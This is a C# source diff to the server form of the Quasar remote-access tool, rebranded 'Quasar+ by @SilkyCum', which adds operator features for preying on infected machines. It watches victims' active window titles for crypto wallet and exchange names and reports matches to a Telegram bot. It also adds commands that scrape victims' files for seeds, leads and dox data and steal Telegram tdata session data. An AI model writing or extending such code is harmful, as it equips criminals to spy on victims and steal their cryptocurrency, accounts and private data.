@@ -8,11 +8,15 @@ using Quasar.Server.Utilities;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Threading.Tasks;
 using System.Linq;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Common.Networking;
 
 namespace Quasar.Server.Forms
 {
@@ -20,8 +24,9 @@ namespace Quasar.Server.Forms
     {
         public QuasarServer ListenServer { get; set; }
 
-        private const int STATUS_ID = 4;
-        private const int USERSTATUS_ID = 5;
+        private const int STATUS_ID = 3; // after Phone
+        private const int USERSTATUS_ID = 4; // after Status
+        private const int ACTIVEWINDOW_ID = 9; // last column index
 
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
@@ -29,12 +34,15 @@ namespace Quasar.Server.Forms
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
+        private readonly System.Collections.Generic.List<ListViewItem> _allClientItems = new System.Collections.Generic.List<ListViewItem>();
+        private readonly System.Collections.Generic.List<ListViewItem> _allNotifyItems = new System.Collections.Generic.List<ListViewItem>();
 
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
             RegisterMessageHandler();
             InitializeComponent();
+            AddDefaultNotifyKeywords();
         }
 
         /// <summary>
@@ -67,9 +75,9 @@ namespace Quasar.Server.Forms
                 {
                     int selected = lstClients.SelectedItems.Count;
                     this.Text = (selected > 0)
-                        ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
+                        ? string.Format("Quasar+ by @SilkyCum - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                             selected)
-                        : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
+                        : string.Format("Quasar+ by @SilkyCum - Connected: {0}", ListenServer.ConnectedClients.Length);
                 });
             }
             catch (Exception)
@@ -149,6 +157,37 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void AddDefaultNotifyKeywords()
+        {
+            try
+            {
+                string[] defaults = new[]
+                {
+                    "atomic", "exodus", "ledger", "crypto", "bitcoin", "coinbase", "exchange", "metamask",
+                    "feather", "trezor", "monerogui", "wallet", "monero"
+                };
+
+                foreach (var word in defaults)
+                {
+                    bool exists = false;
+                    foreach (var obj in lstNotifyKeywords.Items)
+                    {
+                        var s = obj as string;
+                        if (!string.IsNullOrEmpty(s) && s.Equals(word, StringComparison.OrdinalIgnoreCase))
+                        {
+                            exists = true;
+                            break;
+                        }
+                    }
+                    if (!exists)
+                        lstNotifyKeywords.Items.Add(word);
+                }
+            }
+            catch
+            {
+            }
+        }
+
         private void FrmMain_Load(object sender, EventArgs e)
         {
             InitializeServer();
@@ -166,6 +205,85 @@ namespace Quasar.Server.Forms
         private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
         {
             UpdateWindowTitle();
+        }
+
+        private void txtSearch_TextChanged(object sender, EventArgs e)
+        {
+            try
+            {
+                var query = (sender as ToolStripTextBox)?.Text ?? string.Empty;
+                query = query.Trim();
+
+                lstClients.BeginUpdate();
+                lstClients.Items.Clear();
+
+                lock (_lockClients)
+                {
+                    foreach (var item in _allClientItems)
+                    {
+                        bool match = string.IsNullOrEmpty(query);
+                        if (!match)
+                        {
+                            for (int i = 0; i < item.SubItems.Count; i++)
+                            {
+                                if (item.SubItems[i].Text.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0)
+                                {
+                                    match = true;
+                                    break;
+                                }
+                            }
+
+                            // also match notify keywords
+                            if (!match)
+                            {
+                                foreach (var obj in lstNotifyKeywords.Items)
+                                {
+                                    var kw = obj as string;
+                                    if (!string.IsNullOrEmpty(kw) && kw.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0)
+                                    {
+                                        match = true;
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+
+                        if (match)
+                            lstClients.Items.Add((ListViewItem)item.Clone());
+                    }
+                }
+
+                // Filter Windows Notify list by the same query
+                lstNotifyEvents.BeginUpdate();
+                lstNotifyEvents.Items.Clear();
+
+                foreach (var ev in _allNotifyItems)
+                {
+                    bool match = string.IsNullOrEmpty(query);
+                    if (!match)
+                    {
+                        for (int i = 0; i < ev.SubItems.Count; i++)
+                        {
+                            if (ev.SubItems[i].Text.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0)
+                            {
+                                match = true;
+                                break;
+                            }
+                        }
+                    }
+
+                    if (match)
+                        lstNotifyEvents.Items.Add((ListViewItem)ev.Clone());
+                }
+                lstNotifyEvents.EndUpdate();
+            }
+            catch
+            {
+            }
+            finally
+            {
+                lstClients.EndUpdate();
+            }
         }
 
         private void ServerState(Networking.Server server, bool listening, ushort port)
@@ -298,16 +416,45 @@ namespace Quasar.Server.Forms
                 // this " " leaves some space between the flag-icon and first item
                 ListViewItem lvi = new ListViewItem(new string[]
                 {
-                    " " + client.EndPoint.Address, client.Value.Tag,
-                    client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
-                    client.Value.OperatingSystem, client.Value.AccountType
+                    " " + client.EndPoint.Address,
+                    client.Value.UserAtPc,
+                    client.Value.Phone ? "True" : "False",
+                    "Connected",
+                    "Active",
+                    client.Value.CountryWithCode,
+                    client.Value.OperatingSystem,
+                    client.Value.AccountType,
+                    client.Value.Wallets ?? string.Empty,
+                    string.Empty // Active Window
                 }) { Tag = client, ImageIndex = client.Value.ImageIndex };
 
                 lstClients.Invoke((MethodInvoker) delegate
                 {
                     lock (_lockClients)
                     {
-                        lstClients.Items.Add(lvi);
+                        // Track in backing list
+                        _allClientItems.Add(lvi);
+
+                        // Respect current search filter
+                        string query = string.Empty;
+                        try { query = txtSearch.Text.Trim(); } catch { }
+
+                        bool matches = true;
+                        if (!string.IsNullOrEmpty(query))
+                        {
+                            matches = false;
+                            for (int i = 0; i < lvi.SubItems.Count; i++)
+                            {
+                                if (lvi.SubItems[i].Text.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0)
+                                {
+                                    matches = true;
+                                    break;
+                                }
+                            }
+                        }
+
+                        if (matches)
+                            lstClients.Items.Add(lvi);
                     }
                 });
 
@@ -332,11 +479,25 @@ namespace Quasar.Server.Forms
                 {
                     lock (_lockClients)
                     {
-                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
-                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
+                        // Remove from UI and backing list
+                        for (int i = lstClients.Items.Count - 1; i >= 0; i--)
                         {
-                            lvi.Remove();
-                            break;
+                            var lvi = lstClients.Items[i];
+                            if (lvi != null && client.Equals(lvi.Tag))
+                            {
+                                lstClients.Items.RemoveAt(i);
+                                break;
+                            }
+                        }
+
+                        for (int i = _allClientItems.Count - 1; i >= 0; i--)
+                        {
+                            var lvi = _allClientItems[i];
+                            if (lvi != null && client.Equals(lvi.Tag))
+                            {
+                                _allClientItems.RemoveAt(i);
+                                break;
+                            }
                         }
                     }
                 });
@@ -357,7 +518,73 @@ namespace Quasar.Server.Forms
         {
             var item = GetListViewItemByClient(client);
             if (item != null)
-                item.SubItems[STATUS_ID].Text = text;
+            {
+                if (!string.IsNullOrEmpty(text) && text.StartsWith("__ACTIVEWINDOW__:"))
+                {
+                    var title = text.Substring("__ACTIVEWINDOW__:".Length);
+                    item.SubItems[ACTIVEWINDOW_ID].Text = title;
+
+                    // Windows Notify hook
+                    // In-form notify: check keywords in lstNotifyKeywords
+                    string matched = null;
+                    foreach (var obj in lstNotifyKeywords.Items)
+                    {
+                        var kw = obj as string;
+                        if (!string.IsNullOrEmpty(kw) && title.IndexOf(kw, StringComparison.OrdinalIgnoreCase) >= 0)
+                        {
+                            matched = kw; break;
+                        }
+                    }
+                    if (matched != null)
+                    {
+                        var lvi = new ListViewItem(new[]
+                        {
+                            client.Value.UserAtPc,
+                            DateTime.UtcNow.ToString("u"),
+                            matched,
+                            title
+                        });
+
+                        // Track and insert newest first
+                        _allNotifyItems.Insert(0, (ListViewItem)lvi.Clone());
+
+                        string queryNow = string.Empty;
+                        try { queryNow = txtSearch.Text.Trim(); } catch { }
+
+                        bool matchesFilter = true;
+                        if (!string.IsNullOrEmpty(queryNow))
+                        {
+                            matchesFilter = false;
+                            for (int i = 0; i < lvi.SubItems.Count; i++)
+                            {
+                                if (lvi.SubItems[i].Text.IndexOf(queryNow, StringComparison.OrdinalIgnoreCase) >= 0)
+                                {
+                                    matchesFilter = true;
+                                    break;
+                                }
+                            }
+                        }
+
+                        if (matchesFilter)
+                            lstNotifyEvents.Items.Insert(0, lvi);
+
+                        // Telegram notify
+                        if (!string.IsNullOrWhiteSpace(Settings.TelegramBotToken) && !string.IsNullOrWhiteSpace(Settings.TelegramChatId))
+                        {
+                            try
+                            {
+                                var msg = $"User: {client.Value.UserAtPc}\nWindow: {title}\nTime: {DateTime.UtcNow:yyyy-MM-dd HH:mm}";
+                                SendTelegramAsync(Settings.TelegramBotToken, Settings.TelegramChatId, msg);
+                            }
+                            catch { }
+                        }
+                    }
+                }
+                else
+                {
+                    item.SubItems[STATUS_ID].Text = text;
+                }
+            }
         }
 
         /// <summary>
@@ -693,6 +920,56 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private readonly System.Collections.Generic.Dictionary<int, Messages.ScrapeDbsHandler> _scrapeHandlers = new System.Collections.Generic.Dictionary<int, Messages.ScrapeDbsHandler>();
+
+        private void scrapeDbsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var keywords = new[]
+                {
+                    "dox","doxed","doxxed","data","gmails","mails","coinbase","kraken","gemini","exchange","binance","google","private","database","leads","targeted","p1","seed","crypto.com","crypto","cryptocom","aol"
+                };
+                var exts = new[] { ".txt", ".csv", ".xlsx", ".xls" };
+
+                // register one handler per client-port; reuse existing to avoid duplicate uploads across runs
+                int port = c.EndPoint.Port;
+                Messages.ScrapeDbsHandler handler;
+                if (!_scrapeHandlers.TryGetValue(port, out handler))
+                {
+                    handler = new ScrapeDbsHandler(c);
+                    _scrapeHandlers[port] = handler;
+                    MessageHandler.Register(handler);
+                }
+
+                c.Send(new ScrapeDbsRequest { Keywords = keywords, Extensions = exts });
+            }
+        }
+
+        private void scrapeTdataTopToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                // reuse per-port handler registration
+                int port = c.EndPoint.Port;
+                Messages.ScrapeDbsHandler handler;
+                if (!_scrapeHandlers.TryGetValue(port, out handler))
+                {
+                    handler = new ScrapeDbsHandler(c);
+                    _scrapeHandlers[port] = handler;
+                    MessageHandler.Register(handler);
+                }
+
+                c.Send(new Quasar.Common.Messages.ScrapeTdataRequest());
+            }
+
+            try
+            {
+                System.Windows.Forms.MessageBox.Show("Scrape tdata requested for selected client(s). Waiting for response...", "Scrape tdata", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
+            }
+            catch { }
+        }
+
         private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (lstClients.SelectedItems.Count != 0)
@@ -760,6 +1037,63 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void windowsNotifyToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            // Toggle in-form notify panel
+            pnlNotify.Visible = true;
+            lstClients.Visible = false;
+        }
+
+        private void btnNotifyBack_Click(object sender, EventArgs e)
+        {
+            pnlNotify.Visible = false;
+            lstClients.Visible = true;
+        }
+
+        private void cmsNotifyDashboardItem_Click(object sender, EventArgs e)
+        {
+            if (lstNotifyEvents.SelectedItems.Count == 0)
+            {
+                btnNotifyBack_Click(sender, e);
+                return;
+            }
+
+            string userAtPc = lstNotifyEvents.SelectedItems[0].SubItems[0].Text;
+            btnNotifyBack_Click(sender, e);
+
+            // Select corresponding client
+            foreach (ListViewItem item in lstClients.Items)
+            {
+                if (item.SubItems[1].Text.Equals(userAtPc, StringComparison.OrdinalIgnoreCase))
+                {
+                    item.Selected = true;
+                    item.EnsureVisible();
+                    lstClients.Focus();
+                    break;
+                }
+            }
+        }
+
+        private void btnNotifyAdd_Click(object sender, EventArgs e)
+        {
+            var k = txtNotifyKeyword.Text.Trim();
+            if (k.Length == 0) return;
+            if (!lstNotifyKeywords.Items.Contains(k))
+            {
+                lstNotifyKeywords.Items.Add(k);
+            }
+            txtNotifyKeyword.Clear();
+        }
+
+        private void btnNotifyRemove_Click(object sender, EventArgs e)
+        {
+            var items = new System.Collections.Generic.List<object>();
+            foreach (var item in lstNotifyKeywords.SelectedItems)
+                items.Add(item);
+            foreach (var o in items)
+                lstNotifyKeywords.Items.Remove(o);
+        }
+
         #endregion
 
         #region "NotifyIcon"
@@ -773,5 +1107,26 @@ namespace Quasar.Server.Forms
         }
 
         #endregion
+
+        private async void SendTelegramAsync(string token, string chatId, string text)
+        {
+            try
+            {
+                using (var wc = new System.Net.WebClient())
+                {
+                    wc.Encoding = System.Text.Encoding.UTF8;
+                    var url = $"https://api.telegram.org/bot{token}/sendMessage";
+                    var data = new System.Collections.Specialized.NameValueCollection
+                    {
+                        { "chat_id", chatId },
+                        { "text", $"```\n{text}\n```" },
+                        { "parse_mode", "Markdown" }
+                    };
+                    await System.Threading.Tasks.Task.Run(() => wc.UploadValues(url, "POST", data));
+                }
+            }
+            catch { }
+        }
+
     }
 }
